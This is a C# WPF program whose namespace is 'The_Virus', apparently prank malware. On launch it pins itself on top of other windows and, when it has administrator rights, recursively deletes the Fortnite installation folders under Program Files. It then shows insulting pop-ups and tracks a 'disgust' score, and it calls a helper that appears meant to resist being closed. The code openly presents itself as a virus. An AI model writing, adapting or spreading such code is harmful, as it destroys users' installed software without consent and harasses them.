using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Xml.Serialization;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Threading;

namespace The_Virus
{
    public partial class MainWindow : Window
    {
        
    public bool IsUserAnAdmin //Checking if admin right is there
        {
            get
            {
                return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        public int Disgust = Settings1.Default.Disgust; //Creating disgust value
        public MainWindow()
        {           
            this.Topmost = true;
            InitializeComponent();
            ThreadStart checking = new ThreadStart(Check); //Create a Thread that will check if MainWindow is closed
            Thread checkin = new Thread(checking);
            ThreadStart payload1 = new ThreadStart(deleting_fortnite); //Create a Thread for the first payload
            Thread payload_1 = new Thread(payload1);
            checkin.Start(); //Start Payload 1 Thread
            payload_1.Start(); //Start check thread


        }

        
        void deleting_fortnite() //Pretty accurate, this name
        {
 
            string cancer1 = @"C:\Program Files\Epic Games\Fortnite\Fortnite.exe"; //Save as strings every possible path I thought of for this cancer game
            string cancer1_del = @"C:\Program Files\Epic Games\Fortnite";
            string cancer2 = @"C:\Program Files (x86)\Epic Games\Fortnite\Fortnite.exe";
            string cancer2_del = @"C:\Program Files (x86)\Epic Games\Fortnite";
            if (IsUserAnAdmin) //If you are admin
            {
                if (!File.Exists(cancer1) && !File.Exists(cancer2)) //What if you are clean and you don't have fortnite, or you installed it somewhere i don't found
                {
                    Settings1.Default.Disgust = Disgust; //In fact you'll maybe close me so duh, I know you, ya know
                    Disgust = +0;
                    MessageBox.Show("That's sad, I infect you, but you seem clean, you don't have fortnite", "You are a dumb clean guy", MessageBoxButton.OK, MessageBoxImage.Warning, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
                    
                   
                    
                }
                else
                {
                    if (File.Exists(cancer1)) //What if you have fortnite on default location 
                    {
                        Directory.Delete(cancer1_del, true); //Delete Fortnite because you suck
                        Disgust = +1; //You are a little bit disgusting, ya know ?
                        Settings1.Default.Disgust = Disgust; //In fact you'll maybe close me so duh, I know you, ya know
                        MessageBox.Show("You are cancer, you know ?", "You are officially the cancer", MessageBoxButton.OK, MessageBoxImage.Exclamation, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
                        this.Topmost = true;
                    }
                    else
                    {

                        if (File.Exists(cancer2)) //What if fortnite is in another location
                        {
                            Directory.Delete(cancer2_del, true); //Delete it
                            Disgust = +2; //You are REALLY Disgusting
                            Settings1.Default.Disgust = Disgust; //In fact you'll maybe close me so duh, I know you, ya know
                            MessageBox.Show( "You are really cancer, Fortnite,Really ? and you changed the installation path ? You disgust me", "DISGUSTING" , MessageBoxButton.OK, MessageBoxImage.Exclamation, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
                            this.Topmost = true;
                        }
                    }
                }



            }
            else //If you don't have admin right
            {
                MessageBox.Show("Your Fortnite is lucky -_-, big brain..", "heh. Big brain" ,MessageBoxButton.OK, MessageBoxImage.Exclamation, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly); 
                Disgust = +1; //You didn't let me break your pc at my maximum ;-;

            }
            Settings1.Default.Disgust = Disgust; //In fact you'll maybe close me so duh, I know you, ya know
        }
        void Check()
        {
            this.Dispatcher.Invoke(() =>
            {
                Dont_close_me_bitch.Check();
            });
        }
#if DEBUG
        void gimme_value()
        {
            if (Keyboard.IsKeyToggled(Key.V))
            {               
                MessageBox.Show(Disgust.ToString());
            }
        }
#endif
    }
}
   

